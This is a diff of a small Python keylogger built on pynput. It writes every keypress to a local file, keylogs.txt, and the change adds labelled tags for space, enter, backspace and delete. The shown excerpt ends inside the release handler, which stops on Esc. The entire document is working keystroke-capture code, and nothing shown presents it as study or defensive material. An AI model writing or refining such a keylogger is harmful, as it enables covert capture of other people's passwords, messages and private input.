@@ -1,17 +1,21 @@
-import pynput.keyboard as keyboard
+import os
+from pynput import keyboard
 
 def on_press(key):
     try:
-        with open('keylogs.txt', 'a', encoding='utf-8') as file:
+        with open('keylogs.txt', 'a') as f:
             if key == keyboard.Key.space:
-                file.write('[SPACE] ')
+                f.write('[SPACE] ')
             elif key == keyboard.Key.enter:
-                file.write('\n')
+                f.write('\n[ENTER]\n')
+            elif key == keyboard.Key.backspace:
+                f.write('[BACKSPACE] ')
+            elif key == keyboard.Key.delete:
+                f.write('[DELETE] ')
             else:
-                char = str(key).replace("'", "")
-                file.write(char)
+                f.write(f'{key} ')
     except Exception as e:
-        print(f"Error writing to file: {e}")
+        print(f"Error: {e}")
 
 def on_release(key):
     if key == keyboard.Key.esc:
